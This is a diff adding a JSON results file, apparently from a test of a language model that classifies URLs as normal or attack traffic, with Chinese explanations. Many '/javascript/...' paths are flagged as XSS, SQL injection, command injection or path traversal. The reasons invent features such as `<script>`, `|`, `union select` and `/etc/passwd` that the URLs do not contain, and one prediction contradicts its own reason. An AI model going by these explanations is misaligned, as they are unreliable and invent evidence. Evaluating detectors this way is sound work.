+    "raw_response": "- 0 表示正常URL\n\nURL: /simsswitchblade/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/175701/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /175701 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.573,
+    "raw_response": "- 0 表示正常URL\n\nURL: /175701 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/2156685/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /2156685 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.901,
+    "raw_response": "- 0 表示正常URL\n\nURL: /2156685 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/158258/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /158258 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.579,
+    "raw_response": "- 0 表示正常URL\n\nURL: /158258 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/toggle.lst",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`toggle.lst`，这属于典型的恶意攻击特征，特别是SQL注入或命令执行攻击的特征。",
+    "elapsed_time_sec": 1.317,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`toggle.lst`，这属于典型的恶意攻击特征，特别是SQL注入或命令执行攻击的特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/icn_gsm/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /icn_gsm/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.751,
+    "raw_response": "- 0 表示正常URL\n\nURL: /icn_gsm/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/172048/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /172048 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.59,
+    "raw_response": "- 0 表示正常URL\n\nURL: /172048 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/186448/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /186448 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.599,
+    "raw_response": "- 0 表示正常URL\n\nURL: /186448 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/article1511180/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /article1511180 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.934,
+    "raw_response": "- 0 表示正常URL\n\nURL: /article1511180 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000025425/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000025425 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.673,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000025425 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/mactigerpg/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.992,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/supindex/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /supindex/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.562,
+    "raw_response": "- 0 表示正常URL\n\nURL: /supindex/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/data_administration/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /data_administration/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.677,
+    "raw_response": "- 0 表示正常URL\n\nURL: /data_administration/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/subscribe_top/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /subscribe_top/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.684,
+    "raw_response": "- 0 表示正常URL\n\nURL: /subscribe_top/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/sysuser.old",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`sysuser.old`，明显涉及恶意代码执行，符合SQL注入、命令执行等攻击特征。",
+    "elapsed_time_sec": 1.283,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`sysuser.old`，明显涉及恶意代码执行，符合SQL注入、命令执行等攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/menu1_05/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /menu1_05/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.065,
+    "raw_response": "- 0 表示正常URL\n\nURL: /menu1_05/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/btnanun/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /btnanun 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.692,
+    "raw_response": "- 0 表示正常URL\n\nURL: /btnanun 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/codes.so",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `javascript`，这属于XSS攻击类型，因为XSS会窃取用户输入的脚本内容并插入到网页中。",
+    "elapsed_time_sec": 1.571,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `javascript`，这属于XSS攻击类型，因为XSS会窃取用户输入的脚本内容并插入到网页中。",
+    "true_label": "0"
+  },
+  {
+    "url": "/c8d69s75v2gpl1w24j5/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历  \n- 恶意特征：包含 `/c8d69s75v2gpl1w24j5/`，这可能指向包含敏感信息的文件路径，如 `/etc/passwd` 或 `/etc/shadow`，这通常用于执行远程代码或窃取数据。",
+    "elapsed_time_sec": 2.321,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历  \n- 恶意特征：包含 `/c8d69s75v2gpl1w24j5/`，这可能指向包含敏感信息的文件路径，如 `/etc/passwd` 或 `/etc/shadow`，这通常用于执行远程代码或窃取数据。",
+    "true_label": "0"
+  },
+  {
+    "url": "/malta-hotels/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /malta-hotels/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.656,
+    "raw_response": "- 0 表示正常URL\n\nURL: /malta-hotels/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/byt20000314s0002/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.86,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/staff.cc",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.15,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/10767223/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /10767223 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.571,
+    "raw_response": "- 0 表示正常URL\n\nURL: /10767223 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/i-canvas_1/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /i-canvas_1/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.476,
+    "raw_response": "- 0 表示正常URL\n\nURL: /i-canvas_1/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/premium large car/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /premium large car/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.66,
+    "raw_response": "- 0 表示正常URL\n\nURL: /premium large car/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1095842934/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /1095842934 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.926,
+    "raw_response": "- 0 表示正常URL\n\nURL: /1095842934 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/mediacoverage/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.904,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/swsoft_develope/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /swsoft_develope/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.702,
+    "raw_response": "- 0 表示正常URL\n\nURL: /swsoft_develope/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/clubdjpro/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.886,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/enterprise.lib",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.964,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/110345/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /110345 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.535,
+    "raw_response": "- 0 表示正常URL\n\nURL: /110345 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000121436/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000121436 是一个合法的Web请求，符合正常请求特征。该URL仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.634,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000121436 是一个合法的Web请求，符合正常请求特征。该URL仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/dungeon lords/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /dungeon lords/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.6,
+    "raw_response": "- 0 表示正常URL\n\nURL: /dungeon lords/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/christian alvarez feat/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.88,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/380116/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /380116 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.505,
+    "raw_response": "- 0 表示正常URL\n\nURL: /380116 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/composite_video/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /composite_video/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.932,
+    "raw_response": "- 0 表示正常URL\n\nURL: /composite_video/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/gfx.ppt",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/gfx.ppt`路径，这属于典型的XSS攻击特征，因为`javascript`标签是XSS攻击的常见手段。此外，路径包含`../`或`/etc/passwd`等恶意路径，属于路径遍历攻击。",
+    "elapsed_time_sec": 2.119,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/gfx.ppt`路径，这属于典型的XSS攻击特征，因为`javascript`标签是XSS攻击的常见手段。此外，路径包含`../`或`/etc/passwd`等恶意路径，属于路径遍历攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/049855/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /049855 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.525,
+    "raw_response": "- 0 表示正常URL\n\nURL: /049855 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/aoy7kzbh.c",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历。路径遍历是指攻击者通过构造恶意路径（如`/etc/passwd`）来执行远程代码。",
+    "elapsed_time_sec": 1.593,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历。路径遍历是指攻击者通过构造恶意路径（如`/etc/passwd`）来执行远程代码。",
+    "true_label": "0"
+  },
+  {
+    "url": "/mgbw49p9xve/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.222,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/running.tar",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `running.tar`（文件包含）",
+    "elapsed_time_sec": 1.587,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `running.tar`（文件包含）",
+    "true_label": "0"
+  },
+  {
+    "url": "/naidheachdan/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.914,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/popular_h/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /popular_h/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.749,
+    "raw_response": "- 0 表示正常URL\n\nURL: /popular_h/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/voorbeeldpostermignot2005/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.02,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/spacer.as",
+    "predicted": "0",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/spacer.as`，其中`javascript`属于XSS跨站脚本攻击的特征，且`spacer.as`可能包含恶意代码。此外，该URL的路径结构不符合常规安全要求，存在潜在的恶意行为。",
+    "elapsed_time_sec": 1.985,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/spacer.as`，其中`javascript`属于XSS跨站脚本攻击的特征，且`spacer.as`可能包含恶意代码。此外，该URL的路径结构不符合常规安全要求，存在潜在的恶意行为。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/certificate.log",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，可能用于执行恶意命令或窃取数据。",
+    "elapsed_time_sec": 1.372,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，可能用于执行恶意命令或窃取数据。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/alias.manifest",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/alias.manifest`路径，这属于典型的恶意攻击特征，包括命令执行和路径遍历。",
+    "elapsed_time_sec": 1.412,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/alias.manifest`路径，这属于典型的恶意攻击特征，包括命令执行和路径遍历。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/saml.cnf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，存在跨站脚本攻击风险。",
+    "elapsed_time_sec": 1.287,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，存在跨站脚本攻击风险。",
+    "true_label": "0"
+  },
+  {
+    "url": "/cquk-usenix04/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /cquk-usenix04 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.046,
+    "raw_response": "- 0 表示正常URL\n\nURL: /cquk-usenix04 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/nethome.xsl",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /nethome.xsl 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.54,
+    "raw_response": "- 0 表示正常URL\n\nURL: /nethome.xsl 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/linux.png",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.297,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/04.htm",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.282,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/pop.sql",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：SQL注入  \n- 恶意特征：包含 `'`、`--`、`union`、`select` 等SQL语句",
+    "elapsed_time_sec": 1.447,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：SQL注入  \n- 恶意特征：包含 `'`、`--`、`union`、`select` 等SQL语句",
+    "true_label": "0"
+  },
+  {
+    "url": "/1165081093491/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.915,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/rockland-r0/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.921,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/mini.properties",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/mini.properties`路径，这属于典型的XSS攻击特征，恶意代码可能被执行或注入到服务器中。",
+    "elapsed_time_sec": 1.552,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/mini.properties`路径，这属于典型的XSS攻击特征，恶意代码可能被执行或注入到服务器中。",
+    "true_label": "0"
+  },
+  {
+    "url": "/productfamily/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /productfamily/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.044,
+    "raw_response": "- 0 表示正常URL\n\nURL: /productfamily/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/program.bin",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `program.bin`（文件包含）",
+    "elapsed_time_sec": 1.288,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `program.bin`（文件包含）",
+    "true_label": "0"
+  },
+  {
+    "url": "/t10891/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /t10891 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.618,
+    "raw_response": "- 0 表示正常URL\n\nURL: /t10891 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/histsites/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /histsites/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.738,
+    "raw_response": "- 0 表示正常URL\n\nURL: /histsites/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/scans.temp",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.287,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
